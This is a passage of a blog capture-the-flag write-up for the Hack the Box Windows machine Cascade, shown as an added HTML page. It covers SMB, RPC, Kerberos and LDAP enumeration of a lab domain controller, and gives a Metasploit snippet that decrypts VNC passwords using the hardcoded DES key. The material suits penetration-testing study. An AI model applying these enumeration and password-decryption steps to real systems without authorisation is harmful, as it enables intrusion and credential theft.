@@ -1,0 +1,1499 @@
+<!DOCTYPE html><html lang="en-US" ><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"><meta name="generator" content="Jekyll v4.2.2" /><meta property="og:title" content="Hack the Box - Cascade Writeup" /><meta property="og:locale" content="en_US" /><meta name="description" content="Zweilosec’s write-up on the medium difficulty Windows machine Cascade from https://hackthebox.eu" /><meta property="og:description" content="Zweilosec’s write-up on the medium difficulty Windows machine Cascade from https://hackthebox.eu" /><link rel="canonical" href="https://zweilosec.github.io/posts/cascade/" /><meta property="og:url" content="https://zweilosec.github.io/posts/cascade/" /><meta property="og:site_name" content="Hacker’s Rest" /><meta property="og:image" content="https://zweilosec.github.io/assets/img/1-cascade-infocard.png" /><meta property="og:type" content="article" /><meta property="article:published_time" content="2020-07-28T14:00:00+00:00" /><meta name="twitter:card" content="summary_large_image" /><meta property="twitter:image" content="https://zweilosec.github.io/assets/img/1-cascade-infocard.png" /><meta property="twitter:title" content="Hack the Box - Cascade Writeup" /><meta name="twitter:site" content="@zweilosec" /><meta name="google-site-verification" content="google_meta_tag_verification" /> <script type="application/ld+json"> {"@context":"https://schema.org","@type":"BlogPosting","dateModified":"2021-05-03T22:47:36+00:00","datePublished":"2020-07-28T14:00:00+00:00","description":"Zweilosec’s write-up on the medium difficulty Windows machine Cascade from https://hackthebox.eu","headline":"Hack the Box - Cascade Writeup","image":"https://zweilosec.github.io/assets/img/1-cascade-infocard.png","mainEntityOfPage":{"@type":"WebPage","@id":"https://zweilosec.github.io/posts/cascade/"},"url":"https://zweilosec.github.io/posts/cascade/"}</script><title>Hack the Box - Cascade Writeup | Hacker's Rest</title><link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-touch-icon.png"><link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png"><link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png"><link rel="manifest" href="/assets/img/favicons/site.webmanifest"><link rel="shortcut icon" href="/assets/img/favicons/favicon.ico"><meta name="apple-mobile-web-app-title" content="Hacker's Rest"><meta name="application-name" content="Hacker's Rest"><meta name="msapplication-TileColor" content="#da532c"><meta name="msapplication-config" content="/assets/img/favicons/browserconfig.xml"><meta name="theme-color" content="#ffffff"><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://fonts.gstatic.com"><link rel="preconnect" href="https://www.google-analytics.com" crossorigin="use-credentials"><link rel="dns-prefetch" href="https://www.google-analytics.com"><link rel="preconnect" href="https://www.googletagmanager.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://www.googletagmanager.com"><link rel="preconnect" href="https://cdn.jsdelivr.net"><link rel="dns-prefetch" href="https://cdn.jsdelivr.net"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.0.0/dist/css/bootstrap.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.11.2/css/all.min.css"><link rel="stylesheet" href="/assets/css/style.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/magnific-popup@1.1.0/dist/magnific-popup.min.css"> <script src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script> <script defer src="https://cdn.jsdelivr.net/combine/npm/popper.js@1.15.0,npm/bootstrap@4/dist/js/bootstrap.min.js"></script> <script async src="https://cdn.jsdelivr.net/combine/npm/lozad/dist/lozad.min.js,npm/magnific-popup@1/dist/jquery.magnific-popup.min.js"></script> <script defer src="/assets/js/dist/post.min.js"></script> <script defer src="/app.js"></script> <script defer src="https://www.googletagmanager.com/gtag/js?id=UA-170504820-1"></script> <script> document.addEventListener("DOMContentLoaded", function(event) { window.dataLayer = window.dataLayer || []; function gtag(){dataLayer.push(arguments);} gtag('js', new Date()); gtag('config', 'UA-170504820-1'); }); </script><body data-spy="scroll" data-target="#toc"><div id="sidebar" class="d-flex flex-column align-items-end"><div class="profile-wrapper text-center"><div id="avatar"> <a href="/" alt="avatar" class="mx-auto"> <img src="/assets/img/avatar/katana.gif" alt="avatar" onerror="this.style.display='none'"> </a></div><div class="site-title mt-3"> <a href="/">Hacker's Rest</a></div><div class="site-subtitle font-italic">Notes documenting my journey to OSCP and beyond.</div></div><ul class="w-100"><li class="nav-item"> <a href="/" class="nav-link"> <i class="fa-fw fas fa-home ml-xl-3 mr-xl-3 unloaded"></i> <span>HOME</span> </a><li class="nav-item"> <a href="/categories/" class="nav-link"> <i class="fa-fw fas fa-stream ml-xl-3 mr-xl-3 unloaded"></i> <span>CATEGORIES</span> </a><li class="nav-item"> <a href="/tags/" class="nav-link"> <i class="fa-fw fas fa-tags ml-xl-3 mr-xl-3 unloaded"></i> <span>TAGS</span> </a><li class="nav-item"> <a href="/archives/" class="nav-link"> <i class="fa-fw fas fa-archive ml-xl-3 mr-xl-3 unloaded"></i> <span>ARCHIVES</span> </a><li class="nav-item"> <a href="/about/" class="nav-link"> <i class="fa-fw fas fa-info ml-xl-3 mr-xl-3 unloaded"></i> <span>PS C:\>WHOAMI</span> </a></ul><div class="sidebar-bottom mt-auto d-flex flex-wrap justify-content-center"> <a href="https://github.com/zweilosec" aria-label="github" class="order-3" target="_blank" rel="noopener"> <i class="fab fa-github-alt"></i> </a> <a href="https://twitter.com/zweilosec" aria-label="twitter" class="order-4" target="_blank" rel="noopener"> <i class="fab fa-twitter"></i> </a> <a href=" javascript:location.href = 'mailto:' + ['example','doamin.com'].join('@')" aria-label="email" class="order-5" > <i class="fas fa-envelope"></i> </a> <a href="/feed.xml" aria-label="rss" class="order-6" > <i class="fas fa-rss"></i> </a> <span class="icon-border order-2"></span> <span id="mode-toggle-wrapper" class="order-1"> <i class="mode-toggle fas fa-adjust"></i> <script type="text/javascript"> class ModeToggle { static get MODE_KEY() { return "mode"; } static get DARK_MODE() { return "dark"; } static get LIGHT_MODE() { return "light"; } constructor() { if (this.hasMode) { if (this.isDarkMode) { if (!this.isSysDarkPrefer) { this.setDark(); } } else { if (this.isSysDarkPrefer) { this.setLight(); } } } var self = this; /* always follow the system prefers */ this.sysDarkPrefers.addListener(function() { if (self.hasMode) { if (self.isDarkMode) { if (!self.isSysDarkPrefer) { self.setDark(); } } else { if (self.isSysDarkPrefer) { self.setLight(); } } self.clearMode(); } self.updateMermaid(); }); } /* constructor() */ setDark() { $('html').attr(ModeToggle.MODE_KEY, ModeToggle.DARK_MODE); sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.DARK_MODE); } setLight() { $('html').attr(ModeToggle.MODE_KEY, ModeToggle.LIGHT_MODE); sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.LIGHT_MODE); } clearMode() { $('html').removeAttr(ModeToggle.MODE_KEY); sessionStorage.removeItem(ModeToggle.MODE_KEY); } get sysDarkPrefers() { return window.matchMedia("(prefers-color-scheme: dark)"); } get isSysDarkPrefer() { return this.sysDarkPrefers.matches; } get isDarkMode() { return this.mode == ModeToggle.DARK_MODE; } get isLightMode() { return this.mode == ModeToggle.LIGHT_MODE; } get hasMode() { return this.mode != null; } get mode() { return sessionStorage.getItem(ModeToggle.MODE_KEY); } /* get the current mode on screen */ get modeStatus() { if (this.isDarkMode || (!this.hasMode && this.isSysDarkPrefer) ) { return ModeToggle.DARK_MODE; } else { return ModeToggle.LIGHT_MODE; } } updateMermaid() { if (typeof mermaid !== "undefined") { let expectedTheme = (this.modeStatus === ModeToggle.DARK_MODE? "dark" : "default"); let config = { theme: expectedTheme }; /* re-render the SVG › <https://github.com/mermaid-js/mermaid/issues/311#issuecomment-332557344> */ $(".mermaid").each(function() { let svgCode = $(this).prev().children().html(); $(this).removeAttr("data-processed"); $(this).html(svgCode); }); mermaid.initialize(config); mermaid.init(undefined, ".mermaid"); } } flipMode() { if (this.hasMode) { if (this.isSysDarkPrefer) { if (this.isLightMode) { this.clearMode(); } else { this.setLight(); } } else { if (this.isDarkMode) { this.clearMode(); } else { this.setDark(); } } } else { if (this.isSysDarkPrefer) { this.setLight(); } else { this.setDark(); } } this.updateMermaid(); } /* flipMode() */ } /* ModeToggle */ let toggle = new ModeToggle(); $(".mode-toggle").click(function() { toggle.flipMode(); }); </script> </span></div></div><div id="topbar-wrapper" class="row justify-content-center topbar-down"><div id="topbar" class="col-11 d-flex h-100 align-items-center justify-content-between"> <span id="breadcrumb"> <span> <a href="/"> Posts </a> </span> <span>Hack the Box - Cascade Writeup</span> </span> <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i><div id="topbar-title"> Post</div><i id="search-trigger" class="fas fa-search fa-fw"></i> <span id="search-wrapper" class="align-items-center"> <i class="fas fa-search fa-fw"></i> <input class="form-control" id="search-input" type="search" aria-label="search" autocomplete="off" placeholder="Search..."> <i class="fa fa-times-circle fa-fw" id="search-cleaner"></i> </span> <span id="search-cancel" >Cancel</span></div></div><div id="main-wrapper"><div id="main"><div class="row"><div id="post-wrapper" class="col-12 col-lg-11 col-xl-8"><div class="post pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><h1 data-toc-skip>Hack the Box - Cascade Writeup</h1><div class="post-meta text-muted d-flex flex-column"><div> <span class="semi-bold"> zweilosec </span> <span class="timeago " data-toggle="tooltip" data-placement="bottom" title="Tue, Jul 28, 2020, 2:00 PM +0000" prep="on" > Jul 28, 2020 <i class="unloaded">2020-07-28T14:00:00+00:00</i> </span></div><div> <span> <span class="timeago lastmod" data-toggle="tooltip" data-placement="bottom" title="Mon, May 3, 2021, 3:47 PM -0700" prefix="Updated " > May 3, 2021 <i class="unloaded">2021-05-03T22:47:36+00:00</i> </span> </span> <span class="readtime" data-toggle="tooltip" data-placement="bottom" title="6175 words">34 min</span></div><div><meta name="twitter:card" content="summary"><meta name="twitter:site" content="@zweilosec"></div></div><div class="post-content"><h2 id="htb---cascade">HTB - Cascade</h2><h2 id="overview">Overview</h2><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/1-cascade-infocard.png" alt="Descriptive information card about the machine cascade" /></p><p>This medium difficulty Windows machine was a good refresher on themes and techniques I had seen in other machines (such as [Nest] Fix this link! (2020-05-31-nest.md)), but also introduced new things and gave enough of a challenge to be quite fun. With proper enumeration this should be a fairly easy challenge, depending on the comfort level with some aspects (such as reading C# code). This machine is on TJ_Null’s list of OSCP-like machines. Have fun!</p><h2 id="useful-skills-and-tools">Useful Skills and Tools</h2><h3 id="enumerate-smb-shares-without-credentials"><strong>Enumerate SMB shares without credentials</strong></h3><p><code class="language-plaintext highlighter-rouge">smbclient -N -L \\\\&lt;server_IP&gt;\\</code></p><p>or</p><p><code class="language-plaintext highlighter-rouge">smbmap -d &lt;domain&gt; -L -H &lt;IP&gt;</code></p><h3 id="copying-an-entire-smb-folder-recursively-using-smbclient"><strong>Copying an entire SMB folder recursively using smbclient:</strong></h3><blockquote><ol><li>Connect using: <code class="language-plaintext highlighter-rouge">smbclient -U &lt;user&gt; \\\\&lt;ip&gt;\\&lt;folder&gt; &lt;password&gt;</code><li>smb: <code class="language-plaintext highlighter-rouge">tarmode</code><li>smb: <code class="language-plaintext highlighter-rouge">recurse</code><li>smb: <code class="language-plaintext highlighter-rouge">prompt</code><li>smb: <code class="language-plaintext highlighter-rouge">mget &lt;folder_to_copy&gt;</code></ol></blockquote><h3 id="decode-vnc-passwords"><strong>Decode VNC Passwords</strong></h3><p>Many VNC products contain the same DES hardcoded encryption key for user passwords, which makes them trivial to break.</p><div class="language-ruby highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+</pre><td class="rouge-code"><pre><span class="vg">$&gt;</span> <span class="n">msfconsole</span>
+
+<span class="n">msf5</span> <span class="o">&gt;</span> <span class="n">irb</span>
+<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="no">Starting</span> <span class="no">IRB</span> <span class="n">shell</span><span class="o">...</span>
+<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="no">You</span> <span class="n">are</span> <span class="k">in</span> <span class="n">the</span> <span class="s2">"framework"</span> <span class="n">object</span>
+
+<span class="o">&gt;&gt;</span> <span class="n">fixedkey</span> <span class="o">=</span> <span class="s2">"</span><span class="se">\x17\x52\x6b\x06\x23\x4e\x58\x07</span><span class="s2">"</span>
+<span class="o">&gt;&gt;</span> <span class="nb">require</span> <span class="s1">'rex/proto/rfb'</span>
+<span class="o">=&gt;</span> <span class="kp">true</span>
+<span class="o">&gt;&gt;</span> <span class="no">Rex</span><span class="o">::</span><span class="no">Proto</span><span class="o">::</span><span class="no">RFB</span><span class="o">::</span><span class="no">Cipher</span><span class="p">.</span><span class="nf">decrypt</span> <span class="p">[</span><span class="s2">"&lt;encrypted_password&gt;"</span><span class="p">].</span><span class="nf">pack</span><span class="p">(</span><span class="s1">'H*'</span><span class="p">),</span> <span class="n">fixedkey</span>
+<span class="o">=&gt;</span> <span class="s2">"[decoded_output]"</span>
+</pre></table></code></div></div><h3 id="compile-net-code-online"><strong>Compile .NET code online</strong></h3><p>To quickly compile and run any kind of .NET code on the go without having to install Visual Studio and the proper dependencies, I highly recommend the website <a href="https://dotnetfiddle.net/"><code class="language-plaintext highlighter-rouge">https://dotnetfiddle.net/</code></a></p><h3 id="disassemble-net-binaries"><strong>Disassemble .NET binaries</strong></h3><p>Binaries written in .NET languages (such as C#) are fairly simple to break down to the original source code with <a href="https://github.com/icsharpcode/AvaloniaILSpy"><code class="language-plaintext highlighter-rouge">https://github.com/icsharpcode/AvaloniaILSpy</code></a>.</p><h2 id="enumeration">Enumeration</h2><h4 id="nmap-scan"><strong>Nmap scan</strong></h4><p>I started my enumeration with an nmap scan of <code class="language-plaintext highlighter-rouge">10.10.10.182</code>. The options I regularly use are:</p><div class="table-wrapper"><table><thead><tr><th style="text-align: left"><code class="language-plaintext highlighter-rouge">Flag</code><th style="text-align: left">Purpose<tbody><tr><td style="text-align: left"><code class="language-plaintext highlighter-rouge">-p-</code><td style="text-align: left">A shortcut which tells nmap to scan all ports<tr><td style="text-align: left"><code class="language-plaintext highlighter-rouge">-vvv</code><td style="text-align: left">Gives very verbose output so I can see the results as they are found, and also includes some information not normally shown<tr><td style="text-align: left"><code class="language-plaintext highlighter-rouge">-sC</code><td style="text-align: left">Equivalent to <code class="language-plaintext highlighter-rouge">--script=default</code> and runs a collection of nmap enumeration scripts against the target<tr><td style="text-align: left"><code class="language-plaintext highlighter-rouge">-sV</code><td style="text-align: left">Does a service version scan<tr><td style="text-align: left"><code class="language-plaintext highlighter-rouge">-oA $name</code><td style="text-align: left">Saves all three formats (standard, greppable, and XML) of output with a filename of <code class="language-plaintext highlighter-rouge">$name</code></table></div><p>At first my scan wouldn’t go through until I added the <code class="language-plaintext highlighter-rouge">-Pn</code> flag to stop nmap from sending ICMP probes. After that it proceeded normally.</p><div class="language-text highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+23
+24
+25
+26
+27
+28
+29
+30
+31
+32
+33
+34
+35
+36
+</pre><td class="rouge-code"><pre>zweilos@kalimaa:~/htb/cascade$ nmap -p- -sC -sV -Pn -oN cascade.nmap 10.10.10.182
+Starting Nmap 7.80 ( https://nmap.org ) at 2020-06-24 18:46 EDT
+Nmap scan report for 10.10.10.182
+
+PORT      STATE SERVICE       VERSION
+53/tcp    open  domain        Microsoft DNS 6.1.7601 (1DB15D39) (Windows Server 2008 R2 SP1)
+| dns-nsid: 
+|_  bind.version: Microsoft DNS 6.1.7601 (1DB15D39)
+88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2020-06-24 22:52:56Z)
+135/tcp   open  msrpc         Microsoft Windows RPC
+139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
+389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: cascade.local, Site: Default-First-Site-Name)
+445/tcp   open  microsoft-ds?
+636/tcp   open  tcpwrapped
+3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: cascade.local, Site: Default-First-Site-Name)
+3269/tcp  open  tcpwrapped
+5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+|_http-server-header: Microsoft-HTTPAPI/2.0
+|_http-title: Not Found
+49154/tcp open  msrpc         Microsoft Windows RPC
+49155/tcp open  msrpc         Microsoft Windows RPC
+49157/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
+49158/tcp open  msrpc         Microsoft Windows RPC
+49165/tcp open  msrpc         Microsoft Windows RPC
+Service Info: Host: CASC-DC1; OS: Windows; CPE: cpe:/o:microsoft:windows_server_2008:r2:sp1, cpe:/o:microsoft:windows
+
+Host script results:
+|_clock-skew: 4m12s
+| smb2-security-mode: 
+|   2.02: 
+|_    Message signing enabled and required
+| smb2-time: 
+|   date: 2020-06-24T22:53:48
+|_  start_date: 2020-06-24T17:39:31
+
+Nmap done: 1 IP address (1 host up) scanned in 322.04 seconds
+</pre></table></code></div></div><p>The nmap OS detection script identified this machine as <code class="language-plaintext highlighter-rouge">windows_server_2008:r2:sp1</code> which is a pretty old version of Windows! Other than that I found the standard Windows Domain Controller ports open.</p><h4 id="rpcclient"><strong>rpcclient</strong></h4><p>Next, I connected to the RPC service using <code class="language-plaintext highlighter-rouge">rpcclient</code>.</p><div class="language-text highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+</pre><td class="rouge-code"><pre>rpcclient -U "" -N 10.10.10.182
+
+rpcclient $&gt; enumdomusers
+user:[CascGuest] rid:[0x1f5]
+user:[arksvc] rid:[0x452]
+user:[s.smith] rid:[0x453]
+user:[r.thompson] rid:[0x455]
+user:[util] rid:[0x457]
+user:[j.wakefield] rid:[0x45c]
+user:[s.hickson] rid:[0x461]
+user:[j.goodhand] rid:[0x462]
+user:[a.turnbull] rid:[0x464]
+user:[e.crowe] rid:[0x467]
+user:[b.hanson] rid:[0x468]
+user:[d.burman] rid:[0x469]
+user:[BackupSvc] rid:[0x46a]
+user:[j.allen] rid:[0x46e]
+user:[i.croft] rid:[0x46f]
+</pre></table></code></div></div><p>I was not able to get much information, but I did get a list of usernames (and their RIDs).</p><h4 id="metasploit---kerberos-user-enumeration"><strong>Metasploit - Kerberos user enumeration</strong></h4><p>I saved the usernames to a file and ran the Metasploit module <code class="language-plaintext highlighter-rouge">auxiliary(gather/kerberos_enumusers)</code> to see which of them were valid users and to check if any of them did not require pre-authentication.</p><div class="language-text highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+23
+24
+25
+26
+27
+28
+29
+30
+31
+32
+33
+34
+35
+36
+37
+38
+39
+40
+41
+42
+43
+44
+45
+46
+47
+48
+49
+50
+51
+</pre><td class="rouge-code"><pre>msf5 auxiliary(gather/kerberos_enumusers) &gt; run
+[*] Running module against 10.10.10.182
+
+[*] Validating options...
+[*] Using domain: CASCADE.LOCAL...
+[*] 10.10.10.182:88 - Testing User: "cascguest"...
+[*] 10.10.10.182:88 - KDC_ERR_CLIENT_REVOKED - Clients credentials have been revoked
+[-] 10.10.10.182:88 - User: "cascguest" account disabled or locked out
+[*] 10.10.10.182:88 - Testing User: "arksvc"...
+[*] 10.10.10.182:88 - KDC_ERR_PREAUTH_REQUIRED - Additional pre-authentication required
+[+] 10.10.10.182:88 - User: "arksvc" is present
+[*] 10.10.10.182:88 - Testing User: "s.smith"...
+[*] 10.10.10.182:88 - KDC_ERR_PREAUTH_REQUIRED - Additional pre-authentication required
+[+] 10.10.10.182:88 - User: "s.smith" is present
+[*] 10.10.10.182:88 - Testing User: "r.thompson"...
+[*] 10.10.10.182:88 - KDC_ERR_PREAUTH_REQUIRED - Additional pre-authentication required
+[+] 10.10.10.182:88 - User: "r.thompson" is present
+[*] 10.10.10.182:88 - Testing User: "util"...
+[*] 10.10.10.182:88 - KDC_ERR_PREAUTH_REQUIRED - Additional pre-authentication required
+[+] 10.10.10.182:88 - User: "util" is present
+[*] 10.10.10.182:88 - Testing User: "j.wakefield"...
+[*] 10.10.10.182:88 - KDC_ERR_PREAUTH_REQUIRED - Additional pre-authentication required
+[+] 10.10.10.182:88 - User: "j.wakefield" is present
+[*] 10.10.10.182:88 - Testing User: "s.hickson"...
+[*] 10.10.10.182:88 - KDC_ERR_PREAUTH_REQUIRED - Additional pre-authentication required
+[+] 10.10.10.182:88 - User: "s.hickson" is present
+[*] 10.10.10.182:88 - Testing User: "j.goodhand"...
+[*] 10.10.10.182:88 - KDC_ERR_PREAUTH_REQUIRED - Additional pre-authentication required
+[+] 10.10.10.182:88 - User: "j.goodhand" is present
+[*] 10.10.10.182:88 - Testing User: "a.turnbull"...
+[*] 10.10.10.182:88 - KDC_ERR_PREAUTH_REQUIRED - Additional pre-authentication required
+[+] 10.10.10.182:88 - User: "a.turnbull" is present
+[*] 10.10.10.182:88 - Testing User: "e.crowe"...
+[*] 10.10.10.182:88 - KDC_ERR_CLIENT_REVOKED - Clients credentials have been revoked
+[-] 10.10.10.182:88 - User: "e.crowe" account disabled or locked out
+[*] 10.10.10.182:88 - Testing User: "b.hanson"...
+[*] 10.10.10.182:88 - KDC_ERR_CLIENT_REVOKED - Clients credentials have been revoked
+[-] 10.10.10.182:88 - User: "b.hanson" account disabled or locked out
+[*] 10.10.10.182:88 - Testing User: "d.burman"...
+[*] 10.10.10.182:88 - KDC_ERR_PREAUTH_REQUIRED - Additional pre-authentication required
+[+] 10.10.10.182:88 - User: "d.burman" is present
+[*] 10.10.10.182:88 - Testing User: "backupsvc"...
+[*] 10.10.10.182:88 - KDC_ERR_PREAUTH_REQUIRED - Additional pre-authentication required
+[+] 10.10.10.182:88 - User: "backupsvc" is present
+[*] 10.10.10.182:88 - Testing User: "j.allen"...
+[*] 10.10.10.182:88 - KDC_ERR_PREAUTH_REQUIRED - Additional pre-authentication required
+[+] 10.10.10.182:88 - User: "j.allen" is present
+[*] 10.10.10.182:88 - Testing User: "i.croft"...
+[*] 10.10.10.182:88 - KDC_ERR_CLIENT_REVOKED - Clients credentials have been revoked
+[-] 10.10.10.182:88 - User: "i.croft" account disabled or locked out
+[*] Auxiliary module execution completed
+</pre></table></code></div></div><p>This was interesting. Some of the accounts had their credentials revoked and were disabled or locked out. I hoped this was not the result of someone brute-forcing a login attempt! Unfortunately, all of the active accounts required pre-authentication.</p><h4 id="enum4linux"><strong>enum4linux</strong></h4><p>While I was running those other commands I also had the script <code class="language-plaintext highlighter-rouge">enum4linux</code> running in another terminal. This script automates a lot of the common enumeration tasks against a Windows machine, but can take some time to run.</p><div class="language-text highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+23
+24
+25
+26
+27
+28
+29
+30
+31
+32
+33
+34
+35
+36
+37
+38
+39
+40
+41
+42
+43
+44
+45
+46
+47
+48
+49
+50
+51
+52
+53
+54
+</pre><td class="rouge-code"><pre>[+] Getting builtin group memberships:
+Group 'Users' (RID: 545) has member: NT AUTHORITY\INTERACTIVE
+Group 'Users' (RID: 545) has member: NT AUTHORITY\Authenticated Users
+Group 'Users' (RID: 545) has member: CASCADE\Domain Users
+Group 'Guests' (RID: 546) has member: CASCADE\CascGuest
+Group 'Guests' (RID: 546) has member: CASCADE\Domain Guests
+Group 'Pre-Windows 2000 Compatible Access' (RID: 554) has member: NT AUTHORITY\Authenticated Users
+Group 'Windows Authorization Access Group' (RID: 560) has member: NT AUTHORITY\ENTERPRISE DOMAIN CONTROLLERS
+
+[+] Getting local groups:
+group:[Cert Publishers] rid:[0x205]
+group:[RAS and IAS Servers] rid:[0x229]
+group:[Allowed RODC Password Replication Group] rid:[0x23b]
+group:[Denied RODC Password Replication Group] rid:[0x23c]
+group:[DnsAdmins] rid:[0x44e]
+group:[IT] rid:[0x459]
+group:[Production] rid:[0x45a]
+group:[HR] rid:[0x45b]
+group:[AD Recycle Bin] rid:[0x45f]
+group:[Backup] rid:[0x460]
+group:[Temps] rid:[0x463]
+group:[WinRMRemoteWMIUsers__] rid:[0x465]
+group:[Remote Management Users] rid:[0x466]
+group:[Factory] rid:[0x46c]
+group:[Finance] rid:[0x46d]
+group:[Audit Share] rid:[0x471]
+group:[Data Share] rid:[0x472]
+
+[+] Getting local group memberships:
+Group 'Data Share' (RID: 1138) has member: CASCADE\Domain Users
+Group 'AD Recycle Bin' (RID: 1119) has member: CASCADE\arksvc
+Group 'Denied RODC Password Replication Group' (RID: 572) has member: CASCADE\krbtgt
+Group 'Denied RODC Password Replication Group' (RID: 572) has member: CASCADE\Domain Controllers
+Group 'Denied RODC Password Replication Group' (RID: 572) has member: CASCADE\Schema Admins
+Group 'Denied RODC Password Replication Group' (RID: 572) has member: CASCADE\Enterprise Admins
+Group 'Denied RODC Password Replication Group' (RID: 572) has member: CASCADE\Cert Publishers
+Group 'Denied RODC Password Replication Group' (RID: 572) has member: CASCADE\Domain Admins
+Group 'Denied RODC Password Replication Group' (RID: 572) has member: CASCADE\Group Policy Creator Owners
+Group 'Denied RODC Password Replication Group' (RID: 572) has member: CASCADE\Read-only Domain Controllers
+Group 'IT' (RID: 1113) has member: CASCADE\arksvc
+Group 'IT' (RID: 1113) has member: CASCADE\s.smith
+Group 'IT' (RID: 1113) has member: CASCADE\r.thompson
+Group 'Audit Share' (RID: 1137) has member: CASCADE\s.smith
+Group 'HR' (RID: 1115) has member: CASCADE\s.hickson
+Group 'Remote Management Users' (RID: 1126) has member: CASCADE\arksvc
+Group 'Remote Management Users' (RID: 1126) has member: CASCADE\s.smith
+
+[+] Getting domain groups:
+group:[Enterprise Read-only Domain Controllers] rid:[0x1f2]
+group:[Domain Users] rid:[0x201]
+group:[Domain Guests] rid:[0x202]
+group:[Domain Computers] rid:[0x203]
+group:[Group Policy Creator Owners] rid:[0x208]
+group:[DnsUpdateProxy] rid:[0x44f]
+</pre></table></code></div></div><p>The script returned a lot of the same information I could have gotten from other sources such as <code class="language-plaintext highlighter-rouge">ldapsearch</code>, put compiled it into one location, neatly separated by category. As useful as this tool is, I do not recommend using it as your sole source of information, as it chops out a lot of the information fields that can sometimes contain useful information.</p><p>The most useful information I got from this was the group membership for each user.</p><ul><li><code class="language-plaintext highlighter-rouge">IT</code> group contains: <strong>r.thompson</strong>, <strong>s.smith</strong>, and <strong>arksvc</strong>.<li><code class="language-plaintext highlighter-rouge">HR</code> group contains: <strong>s.hickson</strong><li><code class="language-plaintext highlighter-rouge">AD Recycle Bin</code> group contains: <strong>arksvc</strong><li><code class="language-plaintext highlighter-rouge">Remote Management Users</code> group contains <strong>s.smith</strong> and <strong>arksvc</strong><li><code class="language-plaintext highlighter-rouge">Audit Share</code> group contains <strong>s.smith</strong><li><code class="language-plaintext highlighter-rouge">Data Share</code> group contains all <strong>Domain Users</strong></ul><h4 id="smbclient"><strong>smbclient</strong></h4><p>Some of the interesting groups insinuated that there was a <code class="language-plaintext highlighter-rouge">Data</code> and an <code class="language-plaintext highlighter-rouge">Audit</code> share folder.</p><div class="language-text highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+</pre><td class="rouge-code"><pre>zweilos@kalimaa:~/htb/cascade$ smbclient -N \\\\10.10.10.182\\Data
+Anonymous login successful
+tree connect failed: NT_STATUS_ACCESS_DENIED
+</pre></table></code></div></div><p>I tried connecting to each folder anonymously to see what I could find. I was able to login successfully, but the ACL denied me access to those folders. Odd!</p><h4 id="ldapsearch">ldapsearch</h4><p>Since I had found lots of useful information, but still had no credentials, I decided to dive deeper into LDAP and see if there were some details the other tools had missed. (I had even tried using the usernames list as the passwords to check for that common problem, but no dice there).</p><div class="language-text highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+23
+24
+25
+26
+27
+28
+29
+30
+31
+32
+33
+34
+35
+36
+37
+38
+39
+40
+41
+42
+43
+44
+45
+46
+47
+48
+49
+50
+51
+52
+53
+54
+55
+56
+57
+58
+59
+60
+61
+62
+63
+64
+65
+66
+67
+68
+69
+70
+71
+72
+73
+74
+</pre><td class="rouge-code"><pre># Remote Management Users, Groups, UK, cascade.local
+dn: CN=Remote Management Users,OU=Groups,OU=UK,DC=cascade,DC=local
+objectClass: top
+objectClass: group
+cn: Remote Management Users
+member: CN=Steve Smith,OU=Users,OU=UK,DC=cascade,DC=local
+member: CN=ArkSvc,OU=Services,OU=Users,OU=UK,DC=cascade,DC=local
+distinguishedName: CN=Remote Management Users,OU=Groups,OU=UK,DC=cascade,DC=lo
+ cal
+instanceType: 4
+whenCreated: 20200113032705.0Z
+whenChanged: 20200117213541.0Z
+uSNCreated: 94253
